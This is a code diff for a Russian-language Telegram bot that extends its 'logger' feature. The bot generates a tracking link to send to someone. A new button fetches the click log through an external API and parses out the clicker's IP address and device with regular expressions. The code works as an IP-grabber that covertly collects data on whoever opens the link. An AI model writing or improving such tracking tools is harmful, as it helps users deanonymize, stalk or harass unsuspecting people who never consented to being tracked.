@@ -1677,6 +1677,10 @@ def handle_callback(call):
     elif call.data == "menu_logger":
         chat_id = call.message.chat.id
         try:
+            bot.delete_message(chat_id, call.message.message_id)
+        except:
+            pass
+        try:
             r = requests.get(API_LOGGER_GENERATOR, timeout=10)
             if r.status_code == 200:
                 data = r.json()
@@ -1684,13 +1688,12 @@ def handle_callback(call):
                 token = data.get("token")
                 
                 if link and token:
-                    view_url = f"{API_LOGGER_VIEW}{token}"
                     text = (
                         f"🎭 Ваш логгер создан!\n\n"
-                        f"🔗 Ссылка для отправки:\n{link}\n\n"
-                        f"📊 Просмотр логов:\n{view_url}"
+                        f"🔗 Ссылка для отправки:\n{link}"
                     )
                     markup = types.InlineKeyboardMarkup()
+                    markup.add(types.InlineKeyboardButton("📊 Получить лог", callback_data=f"get_log_{token}"))
                     markup.add(types.InlineKeyboardButton("⬅️ Назад", callback_data="menu_enter"))
                     bot.send_message(chat_id, text, reply_markup=markup)
                 else:
@@ -1699,6 +1702,40 @@ def handle_callback(call):
                 bot.send_message(chat_id, f"❌ Ошибка API: {r.status_code}")
         except Exception as e:
             bot.send_message(chat_id, f"❌ Ошибка при создании логгера: {e}")
+        bot.answer_callback_query(call.id)
+    elif call.data.startswith("get_log_"):
+        token = call.data.replace("get_log_", "")
+        chat_id = call.message.chat.id
+        try:
+            view_url = f"{API_LOGGER_VIEW}{token}"
+            r = requests.get(view_url, timeout=10)
+            if r.status_code == 200:
+                data = r.json()
+                if data.get("status") == "success" and data.get("ogs"):
+                    logs = data.get("ogs", [])
+                    if logs:
+                        log_entry = logs[0]
+                        ip_match = re.search(r'IP:\s*([\d.]+)', log_entry)
+                        device_match = re.search(r'Устройство:\s*([^|]+)', log_entry)
+                        ip = ip_match.group(1) if ip_match else "Неизвестно"
+                        device = device_match.group(1).strip() if device_match else "Неизвестно"
+                        
+                        text = (
+                            f"📊 **Лог получен!**\n\n"
+                            f"🌐 IP: {ip}\n"
+                            f"📱 Устройство: {device}"
+                        )
+                        markup = types.InlineKeyboardMarkup()
+                        markup.add(types.InlineKeyboardButton("⬅️ Назад", callback_data="menu_enter"))
+                        bot.send_message(chat_id, text, parse_mode="Markdown", reply_markup=markup)
+                    else:
+                        bot.send_message(chat_id, "❌ Нет данных о переходах.")
+                else:
+                    bot.send_message(chat_id, f"❌ Ошибка: {data.get('status', 'неизвестно')}")
+            else:
+                bot.send_message(chat_id, f"❌ Ошибка API: {r.status_code}")
+        except Exception as e:
+            bot.send_message(chat_id, f"❌ Ошибка: {e}")
         bot.answer_callback_query(call.id)
     elif call.data.startswith("generate_photo_"):
         parts = call.data.split("_")
